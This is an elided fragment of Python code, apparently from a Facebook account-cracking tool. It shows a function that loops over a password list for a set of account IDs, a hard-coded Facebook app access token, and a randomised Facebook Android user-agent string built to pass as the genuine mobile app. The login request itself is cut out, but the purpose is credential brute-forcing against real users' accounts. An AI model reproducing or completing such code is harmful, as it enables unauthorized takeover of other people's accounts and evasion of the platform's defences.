...
def rd2(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				fbcr = sim_id
				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/510.0.0.25.314;FBBV/340905384;FBDM/{density=3.5,width=1080,height=2400};FBLC/en_US;FBRV/305491253;FBCR/Banglalink;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/LE2117;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
